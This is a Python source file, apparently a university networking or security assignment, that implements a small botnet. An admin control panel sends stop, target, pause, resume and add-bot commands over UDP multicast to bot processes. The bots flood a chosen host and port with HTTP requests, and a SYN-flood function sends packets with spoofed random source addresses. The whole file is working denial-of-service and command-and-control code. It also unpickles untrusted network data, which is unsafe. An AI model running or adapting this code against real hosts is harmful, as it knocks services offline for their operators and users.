#Definitely not a botnet
from random import randint
import signal
import socket
import struct
import selectors
import time
import string
import pickle
import sys
import subprocess
import requests
import fcntl
import os
from scapy.all import *


BASE62 = string.ascii_lowercase+string.ascii_uppercase+string.digits
CURSOR_UP_ONE = '\x1b[1A' 
ERASE_LINE = '\x1b[2K' 


def signal_handler(signal, frame):
    sys.stdout.write(CURSOR_UP_ONE) 
    sys.stdout.write(ERASE_LINE) 
    
    print("\nGoodbye.")
    exit(0)

signal.signal(signal.SIGINT, signal_handler)

# set sys.stdin non-blocking
orig_fl = fcntl.fcntl(sys.stdin, fcntl.F_GETFL)
fcntl.fcntl(sys.stdin, fcntl.F_SETFL, orig_fl | os.O_NONBLOCK)

def randInt():
	x = randint(1000,9000)
	return x	
    
def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip


class zerg:
    def __init__(self, name: str = ""):

        # --Init Variables n stuff we'll need----
        self.sel = selectors.DefaultSelector()

        self.isControl =False if name !="admin" else True
        # Commands
        self.kill = False
        self.pause = False

        self.TARGET = "192.168.1.102"
        self.TARGETPORT=5000

        # --Things for communication with victim server (HTTP,TCP)---
        self.HOST = self.TARGET # "host.docker.internal"
        self.PORT = self.TARGETPORT

        # ---Things for communication with brood (Multicast via udp)--
        self.mCastSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.mCastSock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.mCastSock.settimeout(2)
        self.MCAST_TTL = struct.pack('b', 2)
        self.mCastSock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        
        self.MCAST_GRP ='224.3.29.71'  # what we put here
        self.MCAST_PORT =10000
        group = socket.inet_aton(self.MCAST_GRP)
        mreq = struct.pack('4sL', group, socket.INADDR_ANY)
        self.mCastSock.setsockopt( socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        #self.mCastSock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 0)
        self.mCastSock.bind(('', 10000))

        # Listen for socket activity
        if name != "admin":
            self.sel.register(self.mCastSock, selectors.EVENT_READ, self.recvMCAST)
        else:
            self.sel.register(self.mCastSock, selectors.EVENT_READ, self.countBots)
        self.sel.register(sys.stdin, selectors.EVENT_READ, self.controlInput)   # Listen for input activity

        self.verified = []
        self.peers = {}

        self.latest_pws = list()
        self.lastTry=0
        self.id = randint(0,1000000)
#        self.connect()

        self.user_out = ""
        hostname = socket.gethostname()
        self.address = socket.gethostbyname(hostname)
        if name != "admin":
            print("I AM:",self.address)

        self.instruction_buf=[]

    def add_buf(self,inp):
        self.instruction_buf.append(inp)
        if len(self.instruction_buf):
            self.instruction_buf=self.instruction_buf[:5]

    def printMenu(self):
        os.system('cls' if os.name == 'nt' else 'clear')

        menu = f"""
                         Definitely-Not-A-Botnet Control Panel   
                #############################################################    
                #                                                           #
                #   Available instructions:                                 #
                #   "stop" - stop the bots                                  #
                #   "status" - view botnet status                           #
                #   "target" - change target                                #
                #   "pause" - pause attack                                  #
                #   "resume" - resume attack                                #
                #   "add" - add a bot                                       #
                #   "add x" - add x bots (pausing is recommended ;) )       #
                #                                                           #
                #############################################################

    .―――――――――――――――――――――――――――――――――.    .―――――――――――――――――――――――――――――――――――――――――――.
    |                                 |    |                                           |
    | Bots in swarm:{len(self.peers):17} |    | Targeting:{self.TARGET:>20}:{self.TARGETPORT:<9}: |
    |                                 |    |                                           |
    ˙―――――――――――――――――――――――――――――――――˙    ˙―――――――――――――――――――――――――――――――――――――――――――˙

{self.user_out}
> """
        print(menu,end="")
        self.sayPing()
        self.user_out=""
        


        
    def countBots(self):
        try:
                data, server = self.mCastSock.recvfrom(1024)
        except socket.timeout:
            print("aaaaa")
            return
        else:
            recvMSG = pickle.loads(data) 

            if  recvMSG['command'] =="pong":
                if recvMSG['id'] in self.peers:
                    self.peers[recvMSG['id']]=[time.time()] # last seen at: now
                else:
                    self.peers[recvMSG['id']]=[time.time()]  # New peer
            
        

    def sayImHere(self):                           
        '''Send a imhere message'''  # General Kenobi
        msg = {
            'command': 'imhere',

        }
        encodedMSG = pickle.dumps(msg)
        
        # Send the ImHere message to peers (via Multicast)
        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))

    def sayStop(self):
        '''Send a foundpw message'''  # Win
        msg = {
            'command': 'stop',
        }
        encodedMSG = pickle.dumps(msg)

        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
        
    def sayTarget(self,target :str, port:str):
        '''Send a foundpw message'''  # Win
        msg = {
            'command': 'target',
            'target':target,
            'port':port
        }
        self.TARGET=target
        self.TARGETPORT=port if port != "" else self.TARGETPORT
        encodedMSG = pickle.dumps(msg)

        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
        
    def sayPause(self):
        '''Send a foundpw message'''  # Win
        msg = {
            'command': 'pause'
        }
        encodedMSG = pickle.dumps(msg)

        #self.mCastSock.setsockopt(
        #    socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
    
    def sayResume(self):
        '''Send a foundpw message'''  # Win
        msg = {
            'command': 'resume',
        }
        encodedMSG = pickle.dumps(msg)

        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))

    def sayPing(self):
        '''Send a foundpw message'''  # Win
        msg = {
            'command': 'ping',
        }
        encodedMSG = pickle.dumps(msg)

        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))

    def sayPong(self):
        '''Send a foundpw message'''  # Win
        msg = {
            'command': 'pong',
            'id':self.id

        }
        encodedMSG = pickle.dumps(msg)

        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))


    def recvMCAST(self):
        '''Receive messages from our peers (and process them)'''
        try:
            data, server = self.mCastSock.recvfrom(1024)
        except socket.timeout:
            print("aaaaa")
            return
        else:
            recvMSG = pickle.loads(data) 
            if server in self.peers:
                self.peers[server]=[time.time(),self.peers[server][1]] # last seen at: now
            else:
                self.peers[server]=[time.time(),[0,0]]  # New peer
            
            cmd = recvMSG['command']
            if cmd=='imhere':
                # Sort out stored ranges and verified pwds
                pass

               
            elif cmd=='stop':
                try:
                  print("Shutting down...")
                except BlockingIOError:
                        pass
                #print("# PASSWORDS TESTED:", arraySum(self.verified))
                exit(0) # Shutting down...
            elif cmd=='target':
                TARGET = recvMSG['target']
                
                TARGETPORT = recvMSG['port'] if recvMSG['port'] != "" else self.TARGETPORT
                self.HOST = TARGET # "host.docker.internal"
                self.PORT = TARGETPORT
                self.TARGET=TARGET
                self.TARGETPORT = TARGETPORT
                try:
                    print(f"Changing target to {TARGET}:{TARGETPORT} ")
                except BlockingIOError:
                        pass



            elif cmd == "pause":
                print("Paused.")
                self.pause = True
            elif cmd == "resume":
                print("Resumed.")
                self.pause = False
            elif cmd=="ping":
                self.sayPong()
            return



    def syn_attack(self):
        """Creates the AuthHeader with the created pw"""  
   
        s_port = randInt()
        s_eq = randInt()

        w_indow = randint(60000,65534) 
        IP_Packet = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = self.TARGET 
        TCP_Packet = TCP()	
        TCP_Packet.sport = s_port
        TCP_Packet.dport = self.TARGETPORT
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow
        byt = (f"GET / HTTP/1.1\nHost: swarm\n\n").encode()
        send(IP_Packet/TCP_Packet/byt, verbose=0)

    def http_attack(self):
        r = requests.get('http://'+self.TARGET+':'+str(self.TARGETPORT)+'/')

    def http_attack_2(self):
        dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            # Open the connection on that raw socket
            dos.connect((self.TARGET, self.TARGETPORT))

            # Send the request according to HTTP spec
            #old : dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
            byt = (f"GET / HTTP/1.1\nHost: swarm\n\n").encode()
            dos.send(byt)
        except socket.error:
            print (f"\n [ No connection, server may be down ]: {str(socket.error)}")
        finally:
            # Close our socket gracefully
            dos.shutdown(socket.SHUT_RDWR)
            dos.close()


    def send_msg(self, msg):
        """Sends ONE (1) message to VICTIM"""  
        encoded_msg = str(msg).encode("utf-8")
        self.s.send(encoded_msg)


    def controlLoop(self):
        #try:
        
            print("Welcome to Definitely-A-Botnet")
            self.printMenu()
            while(True):
                    toDo = self.sel.select(0)
                    for event, data in toDo:
                        callback = event.data
                        msg = callback()
                    expired = []
                    for peer in self.peers.keys():
                        if time.time() - self.peers[peer][0] > 50:
                            expired+=[peer]
                    for peer in expired:
                        self.peers.pop(peer)
                                
        #except KeyboardInterrupt:
        #    print("Shutting Down... Want to stop bots? y/n")
        #    inp=""
#
        #    inp = sys.stdin.read().rstrip("\n")   #Get user's input
#
        #    if inp=="y":
        #        self.sayStop()
        #    print("Goodbye")
        #    #exit(0)
            

    def controlInput(self):
                try:
                    inp = sys.stdin.read().rstrip("\n")   #Get user's input
                except TypeError:
                    inp =""
              #  window.getch()
              #  if inp == keys.DOWN
                self.user_out= self.user_out + f"> {inp}"

                if(inp =="stop"):
                    self.sayStop()
                elif(inp=="status"):
                    #print("Status Screen Goes here") #TODO status screen
                    self.sayPing()
                    bots = len(self.peers.keys())
                    if bots == 0:
                        self.user_out+="\nCome back in a bit."
                    else:
                        self.user_out+=f"\nbots: {bots}"
                elif("target"in inp):
                    inp=inp.split(" ")
                    siz = len(inp)
                    if siz <2:
                        self.user_out+="\nMissing target!"
                        
                    elif(siz==2):
                        self.sayTarget(inp[1] ,"")
                        self.user_out+=f"\nTargeting {inp[1]}:5000"
                    elif(siz==3):
                        self.sayTarget(inp[1] ,inp[2])
                        self.user_out+=f"\nTargeting {inp[1]}:{inp[2]}"
                    else:
                        print("idk man")
                elif(inp=="pause"):
                    self.user_out+=f"\nPausing."
                    self.sayPause()
                elif(inp=="resume"):
                    self.user_out+=f"\nResuming"
                    self.sayResume()
                elif("add" in inp):
                    inp=inp.split(" ")
                    siz = len(inp)
                    if siz <2 or inp[1]=="":
                        times=1
                    else:
                        times=int(inp[1])
                    for i in range(0,times):
                        #self.sayAdd()
                        subprocess.Popen(["sudo","python3","/home/inryatt/Uni/3ano/apsei/CD/slave.py"], stdout=subprocess.DEVNULL,    stderr=subprocess.DEVNULL)


                    self.user_out+=f"\nAdding {times} new bots."
                else:
                    self.user_out+=f"\n/!\\ Invalid Command /!\\"
                self.printMenu()
   
    def loop(self):
        '''Main Loop'''
        count = 0
        if self.isControl:
            self.controlLoop()
        else:
            print(f"Target:{self.TARGET}:{self.TARGETPORT}")

            while not self.kill:                                  
                #print("all your base are belong to us")         # nice ref :D

                if not self.pause:
                    
                    for i in range(10):
                            self.http_attack_2()
                    count+=1
                    

                expired = []
                for peer in self.peers.keys():
                    if self.peers[peer][0] < time.time() - 5 and time.time() - 15!=0 :
                        expired+=[peer]
                for peer in expired:
                    self.peers.pop(peer)

                toDo = self.sel.select(0)
                for event, data in toDo:
                    callback = event.data
                    msg = callback()

if __name__=="__main__":
    name = sys.argv[1] if len(sys.argv) > 1 else "Brood1"
    slave=zerg(name)
    slave.loop()